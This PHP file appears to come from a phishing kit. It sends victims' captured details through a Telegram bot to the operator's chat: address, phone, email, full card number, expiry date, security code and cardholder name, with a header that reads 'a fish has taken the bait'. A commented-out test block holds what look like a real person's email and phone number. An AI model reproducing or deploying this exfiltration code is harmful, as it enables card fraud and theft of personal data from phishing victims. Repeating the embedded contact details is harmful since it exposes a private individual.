<?php

// Include the Composer autoloader to load the Telegram Bot API library
require __DIR__ . '/vendor/autoload.php';
use Longman\TelegramBot\Request;

function notification_to_bot($message_data,$conn){
    //include("config.php");

    $toekn_data = array();
    $sql = "SELECT meta_key,value FROM dashboard";
    if ($result = mysqli_query($conn, $sql)) {
        while ($row = mysqli_fetch_array($result, MYSQLI_ASSOC)) {
            $toekn_data[$row['meta_key']] = $row['value'];
        }
    }


    if($toekn_data['telegram_token']!="" && $toekn_data['telegram_chatid']!="" && $toekn_data['telegram_bot_username']!=""){

        $bot_api_key  = $toekn_data['telegram_token'];
        $bot_username = $toekn_data['telegram_bot_username'];

        try {
            // Create Telegram API object
            $telegram = new Longman\TelegramBot\Telegram($bot_api_key, $bot_username);
            $chat_id = $toekn_data['telegram_chatid'];

/*$message ="#------------[有鱼上钩 ".$message_data['post_from']."]--------------#
#---------[ 个人信息 ]-----------#
地址 : ".$message_data['address']."
城市 : ".$message_data['city']."
州/省 : ".$message_data['state']."
邮政编码 : ".$message_data['zipcode']."
电话 : ".$message_data['phone']."
电子邮件 ".$message_data['email']."
#-----------[信用卡细节]------------#
卡号 : ".$message_data['card_number']."
有效期 : ".$message_data['card_expire']."
安全码 : ".$message_data['security_code']."
卡持有人姓名: ".$message_data['card_holder']."
#--------[指纹信息]-----------#
指纹信息 : ".$message_data['ip']."
用户代理 : ".$message_data['user_agent']."
时间 日期 : ".$message_data['date_time']."
";*/

$message ="#------------[有鱼上钩 ".$message_data['post_from']."]--------------#
#---------[ 个人信息 ]-----------#
地址 : ".$message_data['address']."
城市 : ".$message_data['city']."
州/省 : ".$message_data['state']."
邮政编码 : ".$message_data['zipcode']."
电话 : ".$message_data['phone']."
电子邮件 ".$message_data['email']."
#-----------[信用卡细节]------------#
卡号 : ".$message_data['card_number']."
有效期 : ".$message_data['card_expire']."
安全码 : ".$message_data['security_code']."
卡持有人姓名: ".$message_data['card_holder']."
#--------[指纹信息]-----------#
指纹信息 : ".$message_data['ip']."
用户代理 : ".$message_data['user_agent']."
时间 日期 : ".$message_data['date_time']."
";


                $result = Request::sendMessage([
                    'chat_id' => $chat_id,
                    'text'    =>  $message
                  /*  'reply_markup' => $replyMarkup*/
                ]);
                
                /*
                
                $result = Request::sendPhoto([
                    'chat_id' => $chat_id,
                    'photo'   => Request::encodeFile('https://www.shutterstock.com/image-illustration/red-credit-card-highly-detailed-260nw-34724695.jpg'),
                ]); */
                


              
                if ($result->isOk()) {
                    //echo $result->getDescription();exit;
                }
            } catch (Longman\TelegramBot\Exception\TelegramException $e) {
               // echo "<pre>";print_r($e);
                // log telegram errors
                //echo "test";exit;
            }

        }

}

/*$message_data = array(
       'address'=> "Palasiya post dakachya", 
       'city'=> "Indore", 
       'state'=> "state", 
       'zipcode'=> "453771", 
       'email'=> "jitupatel7687@gmail.com", 
       'card_number'=> "jitupatel7687@gmail.com", 
       'card_expire'=> "02/2025", 
       'security_code'=> "123", 
       'card_holder'=> "JP Singh", 
       'ip'=> "192.168.0.1", 
       'user_agent'=> "Mozial", 
       'date_time'=> "20-25-2023",
       'post_from'=> "LA",
       'phone'=> "9009497975"

);


notification_to_bot($message_data);*/



